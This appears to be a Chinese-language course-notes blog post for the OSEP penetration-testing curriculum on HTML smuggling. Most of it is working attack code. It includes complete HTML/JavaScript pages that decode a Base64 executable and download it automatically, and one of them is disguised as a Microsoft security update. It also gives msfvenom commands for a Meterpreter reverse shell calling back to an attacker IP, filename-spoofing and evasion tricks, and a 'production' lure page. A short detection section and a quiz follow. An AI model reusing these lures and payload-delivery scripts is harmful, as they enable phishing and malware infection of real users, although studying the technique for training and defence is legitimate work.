---
title: OSEP-03-HTML-Smuggling
description: '03-Office宏攻击 | 05-HTML-Smuggling'
pubDate: 2026-01-30T00:00:14+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# Module 03: Office 宏攻击

## 第二节：HTML Smuggling (HTML 走私)

### 写在前面

如果你是 Web 安全背景，HTML Smuggling 对你来说应该很容易理解：
- 它本质上就是**利用 JavaScript 在浏览器中动态生成文件**
- 类似于你在做 XSS 时动态创建 DOM 元素
- 只不过这次我们创建的是一个可下载的恶意文件

---

## 一、什么是 HTML Smuggling？

### 1.1 概念解释

**HTML Smuggling（HTML 走私）** 是一种利用 HTML5 和 JavaScript 特性，在用户浏览器中动态组装恶意文件并触发下载的技术。

```
传统方式：
┌─────────────┐     HTTP 请求      ┌─────────────┐
│   浏览器    │ ─────────────────▶ │   服务器    │
│             │ ◀───────────────── │  (恶意文件)  │
└─────────────┘     恶意文件        └─────────────┘
                        ↓
              网络安全设备可以检测到恶意文件

HTML Smuggling：
┌─────────────┐     HTTP 请求      ┌─────────────┐
│   浏览器    │ ─────────────────▶ │   服务器    │
│             │ ◀───────────────── │  (HTML页面)  │
└─────────────┘     普通HTML页面    └─────────────┘
       │
       │ JavaScript 在浏览器中
       │ 动态组装恶意文件
       ▼
┌─────────────┐
│  恶意文件   │ ← 文件在浏览器内存中生成
│  (本地生成)  │   网络安全设备看不到！
└─────────────┘
```

### 1.2 为什么有效？

1. **绕过网络检测**：恶意文件不通过网络传输，而是在浏览器中生成
2. **绕过邮件网关**：邮件中只有 HTML 附件或链接，没有可执行文件
3. **绕过代理检测**：代理服务器只看到普通的 HTML/JavaScript 流量
4. **利用用户信任**：用户可能更愿意打开 HTML 文件而不是 EXE 文件

### 1.3 攻击流程

```
1. 攻击者准备
   ├── 生成恶意可执行文件 (如 Meterpreter)
   ├── Base64 编码恶意文件
   └── 嵌入到 HTML/JavaScript 中

2. 投递
   ├── 发送钓鱼邮件，附带 HTML 文件
   ├── 或发送链接指向恶意 HTML 页面
   └── 或将 HTML 嵌入 Office 文档

3. 执行
   ├── 用户打开 HTML 文件/访问页面
   ├── JavaScript 解码 Base64 数据
   ├── 创建 Blob 对象
   ├── 触发文件下载
   └── 用户运行下载的文件

4. 获得访问
   └── 恶意文件执行，建立反向连接
```

---

## 二、技术原理详解

### 2.1 HTML5 Download 属性

HTML5 引入了 `download` 属性，允许指定下载文件的名称：

```html
<!-- 基本用法 -->
<a href="/path/to/file.exe" download="update.exe">点击下载</a>

<!-- 当用户点击链接时，浏览器会下载文件而不是导航到该 URL -->
<!-- download 属性指定保存的文件名 -->
```

**Web 安全类比**：
- 这就像是 `Content-Disposition: attachment; filename="xxx"` 响应头
- 但是由前端控制，不需要服务器配合

### 2.2 Blob 对象

Blob（Binary Large Object）是 JavaScript 中表示二进制数据的对象：

```javascript
// 创建 Blob 对象
var data = new Uint8Array([0x4D, 0x5A, 0x90, 0x00]); // MZ 头
var blob = new Blob([data], {type: 'application/octet-stream'});

// Blob 的特点：
// 1. 可以存储任意二进制数据
// 2. 可以转换为 URL
// 3. 可以用于文件下载
```

### 2.3 URL.createObjectURL

这个方法可以为 Blob 创建一个临时 URL：

```javascript
var blob = new Blob([data], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);

// url 类似于: blob:http://example.com/550e8400-e29b-41d4-a716-446655440000
// 这个 URL 可以用于下载、显示图片等
```

### 2.4 Base64 编码

由于 JavaScript 字符串不能直接包含二进制数据，我们需要使用 Base64 编码：

```javascript
// Base64 解码函数
function base64ToArrayBuffer(base64) {
    // atob() 将 Base64 字符串解码为二进制字符串
    var binary_string = window.atob(base64);
    var len = binary_string.length;

    // 创建 Uint8Array 存储字节
    var bytes = new Uint8Array(len);

    // 逐字符转换为字节
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }

    return bytes.buffer;
}
```

---

## 三、完整实现

### 3.1 方法一：简单的 Download 属性

```html
<!DOCTYPE html>
<html>
<head>
    <title>Software Update</title>
</head>
<body>
    <h1>Important Security Update</h1>
    <p>Click below to download the latest security patch:</p>

    <!-- 直接链接到服务器上的文件 -->
    <a href="http://192.168.119.120/update.exe" download="SecurityUpdate.exe">
        Download Update
    </a>
</body>
</html>
```

**缺点**：
- 文件仍然通过网络传输
- 可能被网络安全设备检测
- 需要用户手动点击

### 3.2 方法二：JavaScript 自动下载

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <script>
        // Base64 编码的恶意文件
        // 使用命令生成: base64 -w 0 payload.exe
        var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA...'; // 完整的 Base64 字符串

        // Base64 解码函数
        function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = binary_string.charCodeAt(i);
            }
            return bytes.buffer;
        }

        // 解码数据
        var data = base64ToArrayBuffer(file);

        // 创建 Blob
        var blob = new Blob([data], {type: 'application/octet-stream'});

        // 设置文件名
        var fileName = 'SecurityUpdate.exe';

        // 创建隐藏的下载链接
        var a = document.createElement('a');
        document.body.appendChild(a);
        a.style = 'display: none';

        // 创建 Blob URL
        var url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;

        // 自动触发下载
        a.click();

        // 清理
        window.URL.revokeObjectURL(url);
    </script>

    <noscript>
        <p>Please enable JavaScript to continue.</p>
    </noscript>
</body>
</html>
```

### 3.3 方法三：带伪装的完整版本

```html
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Security Center</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
        }
        .logo {
            width: 80px;
            margin-bottom: 20px;
        }
        h1 {
            color: #0078d4;
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            line-height: 1.6;
        }
        .progress {
            width: 100%;
            height: 4px;
            background: #e0e0e0;
            border-radius: 2px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            width: 0%;
            height: 100%;
            background: #0078d4;
            animation: loading 2s ease-in-out forwards;
        }
        @keyframes loading {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        .status {
            color: #0078d4;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Microsoft Logo (Base64 encoded small image) -->
        <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMyAyMyI+PHBhdGggZmlsbD0iI2YzNTMyNSIgZD0iTTEgMWgxMHYxMEgxeiIvPjxwYXRoIGZpbGw9IiM4MWJjMDYiIGQ9Ik0xMiAxaDEwdjEwSDEyeiIvPjxwYXRoIGZpbGw9IiMwNWE2ZjAiIGQ9Ik0xIDEyaDEwdjEwSDF6Ii8+PHBhdGggZmlsbD0iI2ZmYmEwOCIgZD0iTTEyIDEyaDEwdjEwSDEyeiIvPjwvc3ZnPg==" alt="Microsoft">

        <h1>Windows Security Update</h1>
        <p>A critical security update is being prepared for your system. Please wait while we download the necessary files.</p>

        <div class="progress">
            <div class="progress-bar"></div>
        </div>

        <p class="status" id="status">Initializing download...</p>
    </div>

    <script>
        // 状态更新
        var statusEl = document.getElementById('status');
        var messages = [
            'Initializing download...',
            'Verifying system compatibility...',
            'Downloading security patch...',
            'Preparing installation...',
            'Download complete!'
        ];

        var msgIndex = 0;
        var statusInterval = setInterval(function() {
            msgIndex++;
            if (msgIndex < messages.length) {
                statusEl.textContent = messages[msgIndex];
            } else {
                clearInterval(statusInterval);
            }
        }, 500);

        // ========== HTML Smuggling 核心代码 ==========

        // Base64 编码的 Payload
        // 生成命令: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe | base64 -w 0
        var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...';

        function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = binary_string.charCodeAt(i);
            }
            return bytes.buffer;
        }

        // 延迟执行，配合进度条动画
        setTimeout(function() {
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'application/octet-stream'});
            var fileName = 'WindowsSecurityUpdate.exe';

            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }, 2500);
    </script>
</body>
</html>
```

---

## 四、生成 Payload

### 4.1 生成可执行文件

```bash
# 生成 64 位 Meterpreter HTTPS Payload
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    -f exe \
    -o payload.exe

# 查看文件大小
ls -la payload.exe
# -rw-r--r-- 1 kali kali 7168 payload.exe
```

### 4.2 Base64 编码

```bash
# Linux 下编码
base64 -w 0 payload.exe > payload.b64

# 或者直接输出（用于复制）
base64 -w 0 payload.exe

# macOS 下编码
base64 -i payload.exe -o payload.b64

# Windows PowerShell 下编码
[Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.exe"))
```

### 4.3 验证编码

```bash
# 解码并验证
base64 -d payload.b64 > decoded.exe

# 比较文件
md5sum payload.exe decoded.exe
# 两个哈希值应该相同
```

---

## 五、浏览器兼容性

### 5.1 不同浏览器的支持情况

| 浏览器 | URL.createObjectURL | msSaveBlob | 备注 |
|--------|---------------------|------------|------|
| Chrome | ✓ | ✗ | 推荐使用 |
| Firefox | ✓ | ✗ | 推荐使用 |
| Edge (Chromium) | ✓ | ✗ | 推荐使用 |
| Edge (Legacy) | ✓ | ✓ | 需要兼容代码 |
| IE 11 | ✗ | ✓ | 需要使用 msSaveBlob |
| Safari | ✓ | ✗ | 可能有限制 |

### 5.2 兼容性代码

```javascript
function downloadFile(data, fileName) {
    var blob = new Blob([data], {type: 'application/octet-stream'});

    // 检测浏览器类型
    if (window.navigator && window.navigator.msSaveOrOpenBlob) {
        // IE 和旧版 Edge
        window.navigator.msSaveOrOpenBlob(blob, fileName);
    } else {
        // 现代浏览器
        var url = window.URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = fileName;
        document.body.appendChild(a);
        a.click();

        // 清理
        setTimeout(function() {
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
        }, 100);
    }
}

// 使用
var data = base64ToArrayBuffer(encodedPayload);
downloadFile(data, 'update.exe');
```

---

## 六、绕过技巧

### 6.1 文件名伪装

```javascript
// 使用看起来合法的文件名
var fileNames = [
    'WindowsUpdate.exe',
    'AdobeFlashUpdate.exe',
    'ChromeSetup.exe',
    'MicrosoftTeams.exe',
    'ZoomInstaller.exe',
    'invoice_2024.exe',
    'document.pdf.exe'  // 利用 Windows 隐藏扩展名
];
```

### 6.2 分段加载

```javascript
// 将 Base64 分成多个部分，避免单个大字符串
var part1 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA...';
var part2 = 'QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...';
var part3 = 'AAAAyAAAAA4fug4AtAnNIbgBTM0hVGhp...';

var fullPayload = part1 + part2 + part3;
```

### 6.3 延迟执行

```javascript
// 延迟执行，避免立即触发
setTimeout(function() {
    // 下载代码
}, Math.random() * 3000 + 2000); // 2-5 秒随机延迟
```

### 6.4 用户交互触发

```javascript
// 需要用户点击才触发下载
document.getElementById('downloadBtn').addEventListener('click', function() {
    // 下载代码
});
```

---

## 七、防御与检测

### 7.1 检测方法

1. **JavaScript 分析**：检测 `Blob`、`createObjectURL`、`atob` 等函数的使用
2. **行为分析**：监控浏览器自动下载行为
3. **内容检查**：检测 HTML 中的大量 Base64 编码数据
4. **沙箱执行**：在沙箱中执行 HTML 文件，观察行为

### 7.2 防御措施

1. **禁用 JavaScript**：对于不信任的 HTML 文件
2. **邮件网关**：扫描 HTML 附件中的可疑代码
3. **浏览器策略**：限制自动下载
4. **用户培训**：教育用户识别可疑文件

---

## 八、实战练习

### 练习 1：基础 HTML Smuggling

1. 使用 msfvenom 生成一个 reverse_https payload
2. 将其 Base64 编码
3. 创建 HTML 文件实现自动下载
4. 在浏览器中测试

### 练习 2：带伪装的版本

1. 设计一个看起来像合法软件更新页面的 HTML
2. 添加进度条和状态提示
3. 实现延迟下载
4. 测试在不同浏览器中的效果

### 练习 3：浏览器兼容性

1. 实现同时支持现代浏览器和 IE 的版本
2. 测试在 Chrome、Firefox、Edge 中的效果
3. 记录不同浏览器的行为差异

---

## 九、代码汇总

### 9.1 最小化版本

```html
<script>
var f='TVqQAAMAAAA...'; // Base64 payload
var b=new Blob([Uint8Array.from(atob(f),c=>c.charCodeAt(0))]);
var a=document.createElement('a');
a.href=URL.createObjectURL(b);
a.download='update.exe';
a.click();
</script>
```

### 9.2 完整生产版本

```html
<!DOCTYPE html>
<html>
<head>
    <title>Document Viewer</title>
    <meta charset="UTF-8">
</head>
<body>
    <div id="content">
        <h2>Loading document...</h2>
        <p>Please wait while we prepare your document.</p>
    </div>

    <script>
    (function() {
        'use strict';

        // 配置
        var CONFIG = {
            payload: 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA...', // Base64 payload
            fileName: 'Document_Viewer.exe',
            delay: 2000
        };

        // Base64 解码
        function b64ToBuffer(b64) {
            var bin = atob(b64);
            var len = bin.length;
            var arr = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                arr[i] = bin.charCodeAt(i);
            }
            return arr.buffer;
        }

        // 下载文件
        function download(data, name) {
            var blob = new Blob([data], {type: 'application/octet-stream'});

            if (navigator.msSaveBlob) {
                navigator.msSaveBlob(blob, name);
            } else {
                var url = URL.createObjectURL(blob);
                var link = document.createElement('a');
                link.href = url;
                link.download = name;
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                setTimeout(function() {
                    URL.revokeObjectURL(url);
                    document.body.removeChild(link);
                }, 100);
            }
        }

        // 主函数
        function main() {
            try {
                var data = b64ToBuffer(CONFIG.payload);
                download(data, CONFIG.fileName);
            } catch (e) {
                console.error('Error:', e);
            }
        }

        // 延迟执行
        setTimeout(main, CONFIG.delay);
    })();
    </script>
</body>
</html>
```

---

## 十、章节测试

### 选择题

1. HTML Smuggling 的主要优势是什么？
   - A) 提高下载速度
   - B) 绕过网络安全检测
   - C) 减少文件大小
   - D) 提高兼容性

2. `URL.createObjectURL` 的作用是？
   - A) 创建网络请求
   - B) 为 Blob 创建临时 URL
   - C) 编码 URL
   - D) 验证 URL

3. 在 IE 浏览器中应该使用什么方法下载文件？
   - A) URL.createObjectURL
   - B) navigator.msSaveBlob
   - C) document.download
   - D) window.download

4. Base64 编码的主要目的是？
   - A) 压缩数据
   - B) 加密数据
   - C) 将二进制数据转换为文本
   - D) 验证数据完整性

5. `atob()` 函数的作用是？
   - A) 编码为 Base64
   - B) 解码 Base64
   - C) 编码为 URL
   - D) 解码 URL

### 答案

1-B, 2-B, 3-B, 4-C, 5-B

---

**下一节**：[01-VBA基础.md](/blog/osep/03-office宏攻击/01-vba基础/)
